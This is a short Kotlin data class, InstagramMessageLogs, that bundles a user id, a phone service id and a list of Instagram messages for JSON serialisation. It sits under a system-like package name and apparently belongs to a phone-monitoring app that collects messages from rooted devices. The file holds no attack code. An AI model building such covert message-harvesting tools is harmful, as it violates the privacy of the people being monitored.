package com.android.services.models.im

import com.android.services.db.entities.InstagramMessageRooted
import com.google.gson.annotations.SerializedName

class InstagramMessageLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("instagramMessages")
    var instagramList: List<InstagramMessageRooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        instagramUnrootedList: List<InstagramMessageRooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        instagramList = instagramUnrootedList
    }
}